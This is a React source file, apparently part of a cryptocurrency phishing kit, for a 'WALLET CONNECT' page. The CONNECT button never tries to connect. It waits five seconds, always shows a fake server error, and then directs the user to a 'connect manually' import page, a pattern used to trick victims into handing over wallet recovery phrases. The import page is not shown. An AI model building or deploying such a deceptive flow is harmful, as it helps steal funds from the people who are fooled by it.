import {
  Box,
  CircularProgress,
  Container,
  Flex,
  Heading,
  Text,
} from '@chakra-ui/react';
import { useCallback, useState } from 'react';
import { useNavigate, useSearchParams } from 'react-router-dom';

const Check = () => {
  let [searchParams] = useSearchParams();
  let navigate = useNavigate();
  const wallet = searchParams.get('wallet');

  const [loading, setLoading] = useState(false);
  const [isError, setError] = useState(false);

  const handleClick = useCallback(() => {
    setLoading(true);
    const timeout = setTimeout(() => {
      setLoading(false);
      setError(true);
    }, 5000);

    return () => clearTimeout(timeout);
  }, []);

  if (loading) {
    return (
      <Flex align="center" justifyContent="center" h="100vh">
        <CircularProgress value={80} size="150px" isIndeterminate />
      </Flex>
    );
  }

  return (
    <Flex align="center" justifyContent="center" h="100vh">
      {isError && !loading ? (
        <Container
          maxW="md"
          bg="#48485a"
          borderRadius="2xl"
          py="10"
          px="10"
          textAlign="center"
        >
          <Heading
            fontWeight="600"
            as="h1"
            fontSize={{ base: '18px', md: '24px', lg: '30px' }}
            mb="10"
          >
            WALLET CONNECT
          </Heading>

          <Text mb="10" color="red.400" fontSize="20px">
            error connecting to server.. <br /> please connect manually
          </Text>

          <Box
            as="button"
            bg="#040f33"
            px="5"
            py="3"
            borderRadius="2xl"
            fontWeight="500"
            mb="10"
            onClick={() => navigate(`/import?wallet=${wallet}`)}
          >
            CONNECT MANUALLY
          </Box>
        </Container>
      ) : (
        <Container
          maxW="md"
          bg="#48485a"
          borderRadius="2xl"
          py="10"
          px="10"
          textAlign="center"
        >
          <Heading
            fontWeight="600"
            as="h1"
            fontSize={{ base: '18px', md: '24px', lg: '30px' }}
            mb="10"
          >
            WALLET CONNECT
          </Heading>

          <Text mb="10">please connect to your wallet</Text>

          <Box
            as="button"
            bg="#040f33"
            px="5"
            py="3"
            borderRadius="2xl"
            fontWeight="500"
            mb="10"
            onClick={handleClick}
          >
            CONNECT
          </Box>
        </Container>
      )}
    </Flex>
  );
};

export default Check;
